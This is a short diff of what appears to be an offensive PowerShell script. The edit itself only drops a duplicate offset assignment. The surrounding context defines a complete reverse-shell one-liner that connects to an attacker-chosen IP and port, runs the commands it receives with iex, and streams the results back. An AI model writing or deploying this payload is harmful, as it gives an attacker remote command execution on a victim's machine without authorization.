@@ -1,5 +1,4 @@
 param([string]$ip,[string]$port,[int]$offset=4)
-$offset = 4
 
 $rev_shell = @'
 $x=(New-Object net.sockets.tcpclient("~",!)).getstream();[byte[]]$b=0..65535|%{0};while(($i=$x.read($b,0,$b.Length))-ne 0){$d=([system.text.encoding]::getencoding(20127)).getbytes(((iex((New-Object -t text.asciiencoding).getstring($b,0,$i))2>&1|out-string)+(pwd).path+"> "));$x.write($d,0,$d.Length);$x.flush()}
